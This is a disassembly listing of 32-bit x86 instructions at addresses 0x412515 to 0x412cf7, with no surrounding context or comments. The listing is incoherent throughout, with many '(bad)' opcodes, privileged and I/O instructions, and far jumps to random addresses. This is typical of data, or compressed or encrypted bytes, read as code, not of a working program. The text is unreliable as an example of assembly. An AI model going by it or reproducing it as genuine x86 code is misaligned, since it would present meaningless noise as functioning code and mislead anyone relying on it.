  412515:	mov    dh,0xde
  412517:	into   
  412518:	(bad)  
  412519:	aam    0x24
  41251b:	popf   
  41251c:	pop    esi
  41251d:	lea    ecx,[edi]
  41251f:	nop
  412520:	fwait
  412521:	xchg   DWORD PTR ds:0x4ac1757c,eax
  412527:	adc    al,0x53
  412529:	(bad)  
  41252a:	imul   eax,DWORD PTR [ebp-0x4],0x1e
  41252e:	inc    ebp
  41252f:	or     DWORD PTR [eax+0x6b05191],esp
  412535:	imul   esi,DWORD PTR [eax+0x78],0xdaefd35f
  41253c:	pop    edx
  41253d:	shl    al,1
  41253f:	xor    DWORD PTR [edx-0x40c1224b],esi
  412545:	gs lock inc esp
  412548:	ins    DWORD PTR es:[edi],dx
  412549:	sub    DWORD PTR ds:0x617180c5,0xffffffdf
  412550:	ficomp WORD PTR [eax]
  412552:	sub    ah,BYTE PTR [eax]
  412554:	loopne 0x41250d
  412556:	stos   BYTE PTR es:[edi],al
  412557:	xor    BYTE PTR [esi],dh
  412559:	jl     0x41251e
  41255b:	in     al,dx
  41255c:	xor    al,0x9
  41255e:	and    al,ch
  412560:	xor    cl,ah
  412562:	icebp  
  412563:	ja     0x412505
  412565:	mov    ecx,0x6bb7464
  41256a:	sbb    ebx,0xedee3cc8
  412570:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412571:	adc    BYTE PTR [ecx],ah
  412573:	sub    esi,DWORD PTR [eax]
  412575:	ins    DWORD PTR es:[edi],dx
  412576:	lahf   
  412577:	cmp    al,0x43
  412579:	or     esp,DWORD PTR [esi+0x10]
  41257c:	jecxz  0x41258b
  41257e:	out    0x9,al
  412580:	dec    esp
  412581:	bnd jae 0x412543
  412584:	test   ecx,ecx
  412586:	mul    esi
  412588:	pop    ds
  412589:	mov    esp,0xc7ebb83
  41258e:	jo     0x4125df
  412590:	hlt    
  412591:	dec    eax
  412592:	outs   dx,DWORD PTR ds:[esi]
  412593:	inc    ecx
  412594:	or     al,0xaa
  412596:	pop    edi
  412597:	out    0x32,eax
  412599:	jo     0x412528
  41259b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41259c:	jmp    0x77b1ede3
  4125a1:	inc    ebp
  4125a2:	inc    ecx
  4125a3:	aaa    
  4125a4:	jo     0x41255b
  4125a6:	scas   eax,DWORD PTR es:[edi]
  4125a7:	adc    al,0xaa
  4125a9:	add    al,0x72
  4125ab:	cmp    al,0x7e
  4125ad:	sbb    DWORD PTR [ecx+ecx*8-0x2dae3fbb],esi
  4125b4:	sbb    al,0x91
  4125b6:	not    BYTE PTR [edi-0x42]
  4125b9:	dec    ecx
  4125ba:	mov    al,0x80
  4125bc:	adc    ah,BYTE PTR [eax-0x75]
  4125bf:	jo     0x4125f4
  4125c1:	cld    
  4125c2:	mov    bl,0x4e
  4125c4:	or     eax,0x1df40ce3
  4125c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4125ca:	repz repz imul ecx,ebp,0xfffffffb
  4125cf:	pushf  
  4125d0:	xchg   bh,cl
  4125d2:	mov    WORD PTR [edi+ecx*2-0x7a8297f3],ss
  4125d9:	jp     0x412561
  4125db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4125dc:	dec    edx
  4125dd:	scas   al,BYTE PTR es:[edi]
  4125de:	xor    eax,0x61ade91
  4125e3:	sub    DWORD PTR [ecx+0x5f72dc6f],edx
  4125e9:	rcl    BYTE PTR [edi+0x6e],cl
  4125ec:	and    edi,esi
  4125ee:	xor    ebx,esi
  4125f0:	sbb    cl,BYTE PTR [esi+0x2e]
  4125f3:	mov    ds:0x265afd99,al
  4125f8:	mov    edx,0x3056474a
  4125fd:	test   BYTE PTR ss:[ebx-0x31321a8b],bl
  412604:	pop    ebp
  412605:	(bad)  
  412606:	jp     0x4125af
  412608:	int    0x73
  41260a:	(bad)  
  41260b:	sti    
  41260c:	sub    BYTE PTR [eax+0x246e2769],bh
  412612:	and    al,0x42
  412614:	cmc    
  412615:	mov    eax,ds:0x36871d2e
  41261a:	sbb    al,0x90
  41261c:	mov    bl,0x9e
  41261e:	pop    esp
  41261f:	mov    al,0x26
  412621:	adc    DWORD PTR [esi-0x4b100aa1],esi
  412627:	cld    
  412628:	mov    dl,0xc2
  41262a:	xchg   esi,eax
  41262b:	push   ebp
  41262c:	mov    ds:0x61728143,al
  412631:	xor    al,BYTE PTR [eax+0x46026fc0]
  412637:	mov    esp,0x99c9a09b
  41263c:	jecxz  0x4126a2
  41263e:	not    al
  412640:	mov    edi,0x30f31d0c
  412645:	fmul   DWORD PTR ds:0xa8bf4309
  41264b:	jecxz  0x412623
  41264d:	(bad)  
  41264e:	in     eax,dx
  41264f:	retf   0x63cd
  412652:	int3   
  412653:	dec    esi
  412654:	fsubr  st,st(1)
  412656:	sbb    DWORD PTR [ebp+0x71778bec],edi
  41265c:	dec    ebx
  41265d:	and    eax,0x4d6b39b1
  412662:	xor    ebp,esp
  412664:	jmp    0x4126ad
  412666:	ror    BYTE PTR [esp+eax*8-0x60424ad1],0xc4
  41266e:	add    dh,BYTE PTR [ebx+0x11]
  412671:	stos   BYTE PTR es:[edi],al
  412672:	mov    al,0x56
  412674:	cmp    DWORD PTR [ebp-0x35],edi
  412677:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412678:	inc    ecx
  412679:	jg     0x4126a6
  41267b:	hlt    
  41267c:	shl    BYTE PTR [edi-0x67d2a3a],cl
  412682:	xor    eax,0xbd5508a6
  412687:	sahf   
  412688:	gs clc 
  41268a:	and    ecx,esi
  41268c:	pop    ebx
  41268d:	retf   
  41268e:	pop    ecx
  41268f:	fs sub bh,dh
  412692:	aaa    
  412693:	push   ecx
  412694:	retf   0xdec0
  412697:	inc    esi
  412698:	rcr    eax,0x9e
  41269b:	mov    bl,0x5b
  41269d:	outs   dx,BYTE PTR ds:[esi]
  41269e:	inc    edi
  41269f:	inc    edx
  4126a0:	test   ebp,eax
  4126a2:	fimul  WORD PTR [ebx+0x2cdd86d6]
  4126a8:	mov    ds:0x53b61087,al
  4126ad:	push   ecx
  4126ae:	rol    DWORD PTR [ecx-0xb],0xf0
  4126b2:	mov    bh,0xf2
  4126b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4126b5:	shl    DWORD PTR [eax+0x6dd8801e],0x67
  4126bc:	mov    ch,0x5c
  4126be:	pop    edx
  4126bf:	and    al,0xaa
  4126c1:	sub    eax,eax
  4126c3:	(bad)  
  4126c4:	sbb    al,0x79
  4126c6:	dec    esp
  4126c7:	mov    gs,WORD PTR [esi-0x29]
  4126ca:	add    ah,BYTE PTR [edi-0x56fb99d3]
  4126d0:	scas   al,BYTE PTR es:[edi]
  4126d1:	test   BYTE PTR [ecx+eiz*2-0x6b263e39],ah
  4126d8:	outs   dx,BYTE PTR ds:[esi]
  4126d9:	dec    ebx
  4126da:	sub    ch,BYTE PTR [ecx+0x2cebf1ca]
  4126e0:	imul   eax,DWORD PTR [esi],0xffffff80
  4126e3:	xchg   ebp,eax
  4126e4:	push   ebx
  4126e5:	int3   
  4126e6:	add    DWORD PTR ds:0xa9e2e8a5,ebx
  4126ec:	imul   ebx,ebp,0xffffff89
  4126ef:	mov    esi,0x1c24dbe4
  4126f4:	dec    ebx
  4126f5:	cmp    al,0xc2
  4126f7:	sbb    dh,BYTE PTR [edi]
  4126f9:	cli    
  4126fa:	gs dec ebx
  4126fc:	sbb    cl,BYTE PTR ds:0x4ea43f77
  412702:	jmp    0xb7420354
  412707:	jecxz  0x412769
  412709:	test   al,0xd7
  41270b:	daa    
  41270c:	ret    
  41270d:	inc    ebp
  41270e:	mov    al,ds:0x8b56b9d1
  412713:	xor    eax,0xcaff7a9d
  412718:	ror    BYTE PTR [edx-0x7b],cl
  41271b:	sbb    dh,BYTE PTR [esi-0x17]
  41271e:	(bad)  
  41271f:	xchg   ebx,eax
  412720:	pop    ecx
  412721:	retf   
  412722:	sub    esp,edi
  412724:	pop    ds
  412725:	mov    dl,0x9c
  412727:	mov    dh,0x5b
  412729:	jl     0x4126da
  41272b:	sub    eax,0xf6b719ef
  412730:	lods   eax,DWORD PTR ds:[esi]
  412731:	mov    bh,0x2c
  412733:	test   BYTE PTR [edi-0x19],bh
  412736:	stc    
  412737:	shl    eax,1
  412739:	arpl   WORD PTR [edi*8-0x7b6e63ba],cx
  412740:	sahf   
  412741:	loop   0x41272e
  412743:	ret    0x1afa
  412746:	and    al,0x76
  412748:	inc    eax
  412749:	int    0xdb
  41274b:	rol    DWORD PTR [edi],cl
  41274d:	add    eax,0x79941c80
  412752:	cdq    
  412753:	data16 mov cl,0xc7
  412756:	jmp    DWORD PTR [ecx+0x345cdb6b]
  41275c:	inc    ecx
  41275d:	pushf  
  41275e:	cwde   
  41275f:	jmp    0x4127a4
  412761:	cs jo  0x412705
  412764:	or     BYTE PTR [esi+0x5],ch
  412767:	mov    eax,ds:0x834a7f7
  41276c:	dec    edx
  41276d:	xchg   esp,eax
  41276e:	retf   0xb27f
  412771:	dec    eax
  412772:	lea    edi,[edi+0x41b3bb52]
  412778:	push   ecx
  412779:	out    dx,al
  41277a:	push   esi
  41277b:	ret    
  41277c:	sub    ch,dh
  41277e:	ja     0x412736
  412780:	cwde   
  412781:	adc    DWORD PTR [edx],esp
  412783:	mov    edx,0x65d4a1a
  412788:	repnz sbb BYTE PTR [edi+ebp*8],al
  41278c:	pop    ss
  41278d:	xchg   ecx,eax
  41278e:	mov    edx,0x8a647169
  412793:	js     0x4127ff
  412795:	jp     0x412725
  412797:	and    al,0xa5
  412799:	sbb    BYTE PTR [edi+0x6bcf5287],dl
  41279f:	mov    ds:0xa7df69f2,al
  4127a4:	fnstcw WORD PTR [ecx+0x7e]
  4127a7:	add    ah,BYTE PTR [esi]
  4127a9:	in     al,dx
  4127aa:	cs mov ecx,0x57146979
  4127b0:	push   esp
  4127b1:	sahf   
  4127b2:	lods   al,BYTE PTR ds:[esi]
  4127b3:	mov    bl,0x18
  4127b5:	jp     0x41282c
  4127b7:	fiadd  DWORD PTR [ecx]
  4127b9:	mov    ebp,DWORD PTR [ebx]
  4127bb:	rcl    BYTE PTR [ebx],0x68
  4127be:	mov    ebx,0x7e74374a
  4127c3:	mov    dl,0x45
  4127c5:	cld    
  4127c6:	lds    edi,FWORD PTR [esi-0x64]
  4127c9:	xor    eax,0xefead7a2
  4127ce:	dec    esi
  4127cf:	(bad)  ds:0x9c71a935
  4127d5:	outs   dx,BYTE PTR ds:[esi]
  4127d6:	cmp    eax,0x86be876
  4127db:	(bad)  
  4127dd:	imul   DWORD PTR [ebx*4-0xdc7fe4c]
  4127e4:	mov    ds:0x7c4b224e,al
  4127e9:	dec    esp
  4127ea:	xchg   ebx,eax
  4127eb:	lds    edx,FWORD PTR [edi-0x16]
  4127ee:	es int3 
  4127f0:	fs pop esi
  4127f2:	jg     0x4127e3
  4127f4:	cmc    
  4127f5:	sub    eax,0x52e19e48
  4127fa:	stos   BYTE PTR es:[edi],al
  4127fb:	ins    BYTE PTR es:[edi],dx
  4127fc:	add    edx,DWORD PTR ds:0x7455164f
  412802:	or     dl,dh
  412804:	std    
  412805:	push   ebx
  412806:	lods   eax,DWORD PTR ds:[esi]
  412807:	or     al,0x61
  412809:	xchg   edi,eax
  41280a:	daa    
  41280b:	xchg   ebx,eax
  41280c:	xchg   ebx,eax
  41280d:	xor    BYTE PTR [edi],bh
  41280f:	(bad)  
  412810:	pop    ds
  412811:	inc    edi
  412812:	(bad)  
  412813:	push   edx
  412814:	dec    ebp
  412815:	jmp    0xc91bdcc2
  41281a:	retf   0x6f98
  41281d:	mov    edi,DWORD PTR [ebp+0x34715bf3]
  412823:	sbb    al,0xd
  412825:	sbb    edx,DWORD PTR [edx]
  412827:	shl    DWORD PTR [ebx+0x6f],0xa7
  41282b:	jecxz  0x412874
  41282d:	into   
  41282e:	cmp    ecx,DWORD PTR [esi]
  412830:	in     al,0x95
  412832:	and    esp,DWORD PTR [ecx]
  412834:	out    dx,eax
  412835:	add    al,0x40
  412837:	jo     0x41280a
  412839:	xor    bh,BYTE PTR [eax+0x1b]
  41283c:	ds (bad) 
  41283e:	(bad)  
  41283f:	fld    DWORD PTR [ebx-0x3f609d75]
  412845:	in     al,dx
  412846:	sub    eax,DWORD PTR [edx]
  412848:	xor    DWORD PTR [ebx+edi*8+0x38],edi
  41284c:	xchg   edx,eax
  41284d:	icebp  
  41284e:	leave  
  41284f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412850:	add    DWORD PTR ds:0x39b4a498,esi
  412856:	rcl    DWORD PTR [ecx],0x16
  412859:	sbb    eax,0x395ee630
  41285e:	je     0x41282a
  412860:	fdivr  st,st(2)
  412862:	cs scas eax,DWORD PTR es:[edi]
  412864:	xchg   DWORD PTR [ecx],esp
  412866:	pop    ecx
  412867:	sub    ch,BYTE PTR [ebp-0x195e7d33]
  41286d:	mov    ds:0xfcd69c80,al
  412872:	(bad)  
  412873:	mov    esi,0x5d4d0e01
  412878:	cld    
  412879:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41287a:	test   eax,0x3551ea29
  41287f:	seta   BYTE PTR [esi+0x29a1cd3d]
  412886:	ffreep st(1)
  412888:	inc    ebp
  412889:	mov    edx,0xbf780b51
  41288e:	sbb    DWORD PTR [edx+0x3720a99e],edx
  412894:	int    0x87
  412896:	int3   
  412897:	lea    edx,[edi+eiz*8+0x20209424]
  41289e:	and    al,0x1e
  4128a0:	jns    0x4128c7
  4128a2:	lea    eax,[esp+ebp*1+0x61]
  4128a6:	scas   al,BYTE PTR es:[edi]
  4128a7:	sub    ch,BYTE PTR gs:[ecx+0x6512d6d1]
  4128ae:	mov    al,ds:0x17dc9a92
  4128b3:	mov    ch,0xf8
  4128b5:	or     eax,DWORD PTR [eax+0x71]
  4128b8:	cmp    al,0xda
  4128ba:	sbb    DWORD PTR [ebp+0x36d5aecb],ebx
  4128c0:	gs ds loop 0x412866
  4128c4:	xchg   ecx,eax
  4128c5:	imul   edi,DWORD PTR [edi+0x2a37bf35],0x56e4b45f
  4128cf:	fdiv   st,st(7)
  4128d1:	pop    es
  4128d2:	jo     0x4128ac
  4128d4:	imul   edi,DWORD PTR [eax],0xb45c96bb
  4128da:	jecxz  0x412877
  4128dc:	outs   dx,BYTE PTR ds:[esi]
  4128dd:	ret    0x4070
  4128e0:	call   0xf26c:0xbb8d58e1
  4128e7:	mov    esi,0x6fa29ad2
  4128ec:	leave  
  4128ed:	jge    0x4128f0
  4128ef:	inc    ebp
  4128f0:	pop    ss
  4128f1:	imul   esi,DWORD PTR [ebp+0x3c8545c1],0xc0517c36
  4128fb:	dec    esi
  4128fc:	pushf  
  4128fd:	and    BYTE PTR [ecx+0x29b09265],al
  412903:	push   ebp
  412904:	aam    0x86
  412906:	jmp    0x4e60:0xf8d75d9d
  41290d:	inc    ebp
  41290e:	std    
  41290f:	int3   
  412910:	jmp    0xc361021c
  412915:	pop    esi
  412916:	ret    0x9bde
  412919:	mov    esp,0xed8205eb
  41291e:	adc    al,0xb2
  412920:	lods   eax,DWORD PTR ds:[esi]
  412921:	nop
  412922:	rcr    BYTE PTR [ecx-0x253ffb99],cl
  412928:	lods   al,BYTE PTR ds:[esi]
  412929:	sub    ebx,DWORD PTR [eax-0x16]
  41292c:	mov    ah,0x1d
  41292e:	mov    ebx,0xb912efb6
  412933:	jle    0x412921
  412935:	and    ecx,DWORD PTR [edi]
  412937:	jp     0x412931
  412939:	pop    ds
  41293a:	fisubr WORD PTR [edx]
  41293c:	repz fiadd DWORD PTR [esi+0x343330f2]
  412943:	push   ds
  412944:	cmp    eax,0xb5b84549
  412949:	popf   
  41294a:	fimul  DWORD PTR [esi+0x1d80586d]
  412950:	test   DWORD PTR [edi+0x67d47a69],ebx
  412956:	mov    dl,0x1e
  412958:	fbld   TBYTE PTR ds:0x4f002c03
  41295e:	fld    DWORD PTR [esi]
  412960:	push   0x71
  412962:	inc    esp
  412963:	mov    eax,ds:0x2ffac2fb
  412968:	xchg   ecx,eax
  412969:	inc    ecx
  41296a:	int3   
  41296b:	pop    ds
  41296c:	push   esi
  41296d:	fninit 
  41296f:	and    BYTE PTR [ebp-0x628aa8bc],bh
  412975:	inc    edx
  412976:	mov    eax,ds:0x342ae288
  41297b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41297c:	push   esp
  41297d:	(bad)  
  41297e:	pop    edi
  41297f:	jle    0x412919
  412981:	sbb    dl,dh
  412983:	dec    ecx
  412984:	test   DWORD PTR [esi+0xe],edi
  412987:	cwde   
  412988:	cwde   
  412989:	adc    edx,DWORD PTR [ebp+0x125a654a]
  41298f:	xor    eax,0xc0725b86
  412994:	cli    
  412995:	stc    
  412996:	cmc    
  412997:	pop    eax
  412998:	popf   
  412999:	sbb    DWORD PTR [edi-0x6d],eax
  41299c:	retf   0xf343
  41299f:	dec    ecx
  4129a0:	lods   al,BYTE PTR ds:[esi]
  4129a1:	daa    
  4129a2:	popf   
  4129a3:	mov    edx,es
  4129a5:	cs sub al,0xf9
  4129a8:	or     ebx,DWORD PTR [edi+eax*8-0x40f9ab21]
  4129af:	cmp    DWORD PTR [ebx],edx
  4129b1:	mov    bh,0x18
  4129b3:	scas   al,BYTE PTR es:[edi]
  4129b4:	nop
  4129b5:	dec    ecx
  4129b6:	popa   
  4129b7:	or     eax,0xaaee6f14
  4129bc:	mov    edi,0x24b17202
  4129c1:	cmp    cl,BYTE PTR [edx]
  4129c3:	push   es
  4129c4:	mov    dl,0x14
  4129c6:	push   cs
  4129c7:	xchg   DWORD PTR [ebp-0x74922eeb],edx
  4129cd:	mov    ebx,0xceb933cf
  4129d2:	sbb    eax,0xb3bdcfa2
  4129d7:	jo     0x4129bb
  4129d9:	aad    0xca
  4129db:	jno    0x412976
  4129dd:	out    dx,eax
  4129de:	sub    bl,bl
  4129e0:	pop    es
  4129e1:	sbb    al,0xcd
  4129e3:	fdiv   DWORD PTR [edi-0x7dd8d593]
  4129e9:	stc    
  4129ea:	mov    ch,0x9a
  4129ec:	inc    edx
  4129ed:	xor    DWORD PTR gs:[ecx],esi
  4129f0:	mov    ds:0xd1f1a1e3,eax
  4129f5:	or     BYTE PTR [ecx],0x19
  4129f8:	pop    es
  4129f9:	ss jnp 0x4129d3
  4129fc:	xor    DWORD PTR [esi+0x13],eax
  4129ff:	pop    ebp
  412a00:	stos   DWORD PTR es:[edi],eax
  412a01:	adc    al,0x34
  412a03:	loopne 0x4129f5
  412a05:	mov    esp,0xa25db6b0
  412a0a:	sti    
  412a0b:	sbb    ch,al
  412a0d:	addr16 rol cl,cl
  412a10:	push   ds
  412a11:	repz fwait
  412a13:	test   al,0x73
  412a15:	push   edx
  412a16:	scas   eax,DWORD PTR es:[edi]
  412a17:	pop    eax
  412a18:	dec    edx
  412a19:	push   ebp
  412a1a:	fnstenv ds:0xdce4d7c3
  412a20:	cwde   
  412a21:	mov    ds:0x535da140,al
  412a26:	mov    WORD PTR [edx+0x239a3672],?
  412a2c:	xor    BYTE PTR [ebx-0x12fb9e30],ch
  412a32:	loopne 0x412a6f
  412a34:	ror    BYTE PTR [ecx-0x7ed4e539],1
  412a3a:	rol    BYTE PTR [edi+0xb],cl
  412a3d:	pop    edi
  412a3e:	lds    ebp,FWORD PTR [edi+esi*1-0x119ee0c6]
  412a45:	cli    
  412a46:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412a47:	inc    eax
  412a48:	ret    
  412a49:	pop    ss
  412a4a:	sub    edx,esi
  412a4c:	mov    esi,0x8985b570
  412a51:	(bad)  
  412a52:	mov    esi,0x7dc2ebb1
  412a57:	adc    DWORD PTR [ecx+0x30],0x33
  412a5b:	add    BYTE PTR [ebx],al
  412a5d:	into   
  412a5e:	fnstcw WORD PTR [esi+0x7d7718d8]
  412a64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412a65:	pushf  
  412a66:	sbb    eax,DWORD PTR [ecx-0x2d5ad138]
  412a6c:	pushf  
  412a6d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412a6e:	sti    
  412a6f:	fstp   QWORD PTR [edx+edx*2-0x4b]
  412a73:	lods   al,BYTE PTR ds:[esi]
  412a74:	das    
  412a75:	mov    al,ds:0xfea0799d
  412a7a:	inc    ecx
  412a7b:	inc    edx
  412a7c:	mov    eax,0x16fe65eb
  412a81:	dec    ebp
  412a82:	mov    ds:0xe094885f,eax
  412a87:	and    cl,BYTE PTR [edi]
  412a89:	xchg   esp,eax
  412a8a:	inc    ebp
  412a8b:	jo     0x412aa5
  412a8d:	stc    
  412a8e:	in     al,dx
  412a8f:	jle    0x412ae6
  412a91:	mov    dl,0x77
  412a93:	int3   
  412a94:	inc    edx
  412a95:	repz cmp edx,esi
  412a98:	xchg   edx,eax
  412a99:	jecxz  0x412aa0
  412a9b:	ins    BYTE PTR es:[edi],dx
  412a9c:	xlat   BYTE PTR ds:[ebx]
  412a9d:	ret    0x394e
  412aa0:	jb     0x412b1a
  412aa2:	jns    0x412b02
  412aa4:	ficomp DWORD PTR [ecx]
  412aa6:	jo     0x412aba
  412aa8:	(bad)  
  412aa9:	(bad)  
  412aaa:	test   al,0xc4
  412aac:	cwde   
  412aad:	ret    
  412aae:	push   cs
  412aaf:	and    eax,0xc3c86e6a
  412ab4:	mov    bl,0x7f
  412ab6:	mov    al,0x7a
  412ab8:	sub    DWORD PTR [ebp-0x25c70087],0x78
  412abf:	test   ecx,ebp
  412ac1:	inc    esp
  412ac2:	das    
  412ac3:	ret    
  412ac4:	jbe    0x412adf
  412ac6:	mov    bl,0xd0
  412ac8:	mov    dl,al
  412aca:	arpl   WORD PTR [ebx-0x1b],di
  412acd:	out    0xc2,al
  412acf:	lea    edx,[ecx+ecx*1+0x7c80ff8a]
  412ad6:	(bad)  
  412ad7:	repnz fnsave [edx-0x55]
  412adb:	sar    ebp,0x1a
  412ade:	dec    eax
  412adf:	fsubr  st(2),st
  412ae1:	mov    ah,0xcf
  412ae3:	loope  0x412b45
  412ae5:	je     0x412b52
  412ae7:	jmp    0xb346:0x8c8d7f01
  412aee:	retf   0x41b
  412af1:	add    DWORD PTR [esp+eax*1],ebx
  412af4:	push   edx
  412af5:	mov    al,0x2e
  412af7:	cld    
  412af8:	mov    bl,0x1b
  412afa:	inc    esi
  412afb:	fs push ebx
  412afd:	pop    eax
  412afe:	sbb    cl,bh
  412b00:	mov    edi,0x52ea4788
  412b05:	js     0x412a87
  412b07:	xor    DWORD PTR [ebx-0x56],0xffffffdb
  412b0b:	lock or al,0x19
  412b0e:	pop    ecx
  412b0f:	inc    ebx
  412b10:	and    al,0xf3
  412b12:	cmp    dl,BYTE PTR [ebx+0x5bbe6893]
  412b18:	mul    BYTE PTR [bx+si+0x39]
  412b1c:	xchg   ch,dh
  412b1e:	mov    ch,0xad
  412b20:	add    BYTE PTR [ecx+0x79],dl
  412b23:	pop    edx
  412b24:	mov    esi,0xc6611798
  412b29:	inc    esp
  412b2a:	sahf   
  412b2b:	arpl   ax,sp
  412b2d:	shl    DWORD PTR [ebx+0x7707b06f],1
  412b33:	and    DWORD PTR [bx+si-0x3f],ecx
  412b37:	call   0x5c88:0x8a8032fd
  412b3e:	or     eax,0xd3817af4
  412b43:	dec    ebx
  412b44:	daa    
  412b45:	out    0xba,al
  412b47:	test   al,0xcf
  412b49:	retf   
  412b4a:	sub    cl,BYTE PTR [edx+eiz*1-0x73b436f2]
  412b51:	push   esp
  412b52:	adc    BYTE PTR [esp+ebx*1-0x14],bl
  412b56:	pextrw ebp,(bad),0xc5
  412b58:	lods   eax,DWORD PTR ds:[esi]
  412b59:	xchg   BYTE PTR [esi],al
  412b5b:	sub    al,ch
  412b5d:	mov    DWORD PTR [edx],ebx
  412b5f:	mov    ds:0x2f81cdef,eax
  412b64:	fdiv   QWORD PTR [edi+0x58]
  412b67:	out    0x2,al
  412b69:	aaa    
  412b6a:	mov    ah,0xee
  412b6c:	lods   eax,DWORD PTR ds:[esi]
  412b6d:	jno    0x412b1d
  412b6f:	adc    al,0x7c
  412b71:	xor    eax,0x958d0dd6
  412b76:	sub    bl,ah
  412b78:	(bad)  
  412b7a:	xchg   ecx,eax
  412b7b:	jae    0x412b96
  412b7d:	loop   0x412b80
  412b7f:	xchg   edx,eax
  412b80:	aas    
  412b81:	jae    0x412b79
  412b83:	inc    ecx
  412b84:	xchg   BYTE PTR [ecx],ah
  412b86:	push   ss
  412b87:	sub    dl,al
  412b89:	inc    esi
  412b8a:	ds adc eax,0x648f48d
  412b90:	int    0x3a
  412b92:	test   al,0xeb
  412b94:	or     ebx,edi
  412b96:	scas   eax,DWORD PTR es:[edi]
  412b97:	clc    
  412b98:	mov    BYTE PTR [eax+edi*8+0x4e],0x4a
  412b9d:	pop    ds
  412b9e:	dec    eax
  412b9f:	fild   QWORD PTR [ebp-0x6d]
  412ba2:	add    edi,DWORD PTR [edi-0x20]
  412ba5:	loopne 0x412b96
  412ba7:	jmp    DWORD PTR [edx-0x5e9be365]
  412bad:	adc    al,0x83
  412baf:	clc    
  412bb0:	mov    edi,0x4a120192
  412bb5:	sbb    edx,ebx
  412bb7:	xor    BYTE PTR [edi-0x567ae396],bh
  412bbd:	icebp  
  412bbe:	repz stc 
  412bc0:	sub    al,bh
  412bc2:	ins    BYTE PTR es:[edi],dx
  412bc3:	stc    
  412bc4:	sbb    ah,BYTE PTR [edx-0x34c9b635]
  412bca:	ins    BYTE PTR es:[edi],dx
  412bcb:	stos   BYTE PTR es:[edi],al
  412bcc:	adc    eax,0xdcaf851c
  412bd1:	mov    ds:0xc7fa6693,al
  412bd6:	cdq    
  412bd7:	jns    0x412b92
  412bd9:	and    BYTE PTR [edi],bh
  412bdb:	add    BYTE PTR [edi],0x7
  412bde:	out    dx,al
  412bdf:	cmp    edx,edx
  412be1:	mov    ds:0x6154eb9e,eax
  412be6:	(bad)  
  412be7:	call   0xdddd:0x5fabf5b4
  412bee:	sub    edx,DWORD PTR [esi+0x17033c74]
  412bf4:	pop    ebx
  412bf5:	mov    DWORD PTR [edi-0x19],esp
  412bf8:	rol    ecx,cl
  412bfa:	jmp    0x138e:0x51a0c602
  412c01:	adc    edi,DWORD PTR [ebp-0x2d]
  412c04:	ins    BYTE PTR es:[edi],dx
  412c05:	xchg   ebp,eax
  412c06:	and    edx,DWORD PTR [esi]
  412c08:	or     BYTE PTR [edx+0xa],al
  412c0b:	cld    
  412c0c:	psubq  mm1,QWORD PTR [ecx+eiz*8+0x62]
  412c11:	(bad)  
  412c13:	or     eax,0x76d4f5e1
  412c18:	out    dx,eax
  412c19:	or     bh,dl
  412c1b:	or     al,0x96
  412c1d:	mov    BYTE PTR [ebx],bh
  412c1f:	ficomp DWORD PTR [esi-0x307f257f]
  412c25:	inc    esi
  412c26:	call   0x5263:0xf3875c5c
  412c2d:	sub    DWORD PTR ds:0x78d4399e,edi
  412c33:	out    dx,al
  412c34:	adc    eax,0xc973b8a8
  412c39:	neg    BYTE PTR ss:[edx-0x1f]
  412c3d:	mov    ds:0xbc918d70,al
  412c42:	add    al,0xb2
  412c44:	push   esp
  412c45:	scas   eax,DWORD PTR es:[edi]
  412c46:	adc    BYTE PTR ds:0x1cf11e36,0x1a
  412c4d:	or     DWORD PTR [ecx+0x51e12d60],0xffffffa1
  412c54:	or     DWORD PTR [ecx],edx
  412c56:	lea    ecx,[esi]
  412c58:	fisubr WORD PTR [edi+0x2af4716]
  412c5e:	mov    ebx,0x1883a397
  412c63:	push   es
  412c64:	mov    cl,0xde
  412c66:	retf   
  412c67:	mov    esp,0x74f0f591
  412c6c:	xor    cl,dh
  412c6e:	ror    ebx,1
  412c70:	jbe    0x412ccc
  412c72:	repnz xor ah,cl
  412c75:	call   0xee0c:0x67666073
  412c7c:	(bad)  
  412c7d:	push   ebp
  412c7e:	(bad)  
  412c7f:	jne    0x412c81
  412c81:	lock cdq 
  412c83:	adc    ch,BYTE PTR [ebx-0xf]
  412c86:	les    ecx,FWORD PTR ds:0xcb51ea42
  412c8c:	pop    edi
  412c8d:	jne    0x412c0f
  412c8f:	sub    ebx,DWORD PTR [ecx]
  412c91:	sti    
  412c92:	mov    DWORD PTR [ecx-0x27],esp
  412c95:	mov    ebx,edx
  412c97:	or     DWORD PTR [ecx+0x13],0x73f78c6d
  412c9e:	jg     0x412c8c
  412ca0:	mov    cl,0x39
  412ca2:	adc    esp,DWORD PTR [eax+0x1b]
  412ca5:	mov    ah,0x4f
  412ca7:	out    dx,eax
  412ca8:	imul   eax,ebx,0xffffffa6
  412cab:	loop   0x412c82
  412cad:	scas   eax,DWORD PTR es:[edi]
  412cae:	jo     0x412c34
  412cb0:	mov    al,0x44
  412cb2:	mov    ds:0xe793f0c9,al
  412cb7:	and    edi,ebp
  412cb9:	inc    esp
  412cba:	or     BYTE PTR [esi+ecx*4-0x7a285c54],ch
  412cc1:	sub    ah,BYTE PTR [eax]
  412cc3:	jmp    0x7e11bf58
  412cc8:	rcr    cl,cl
  412cca:	rol    BYTE PTR [ebp+0xd],0x49
  412cce:	call   0x1f6a3185
  412cd3:	test   eax,0x18e52615
  412cd8:	fwait
  412cd9:	sbb    ecx,ebp
  412cdb:	pop    ebp
  412cdc:	xchg   ecx,eax
  412cdd:	cdq    
  412cde:	jb     0x412c89
  412ce0:	ins    BYTE PTR es:[edi],dx
  412ce1:	into   
  412ce2:	ss mov edi,0xaaf07d52
  412ce8:	sbb    DWORD PTR [bx+di+0x58],edi
  412cec:	inc    edi
  412ced:	mov    ah,BYTE PTR [edx+edi*1-0x3e]
  412cf1:	lds    edi,FWORD PTR [ebp+0x5387ded8]
  412cf7:	pop    eax
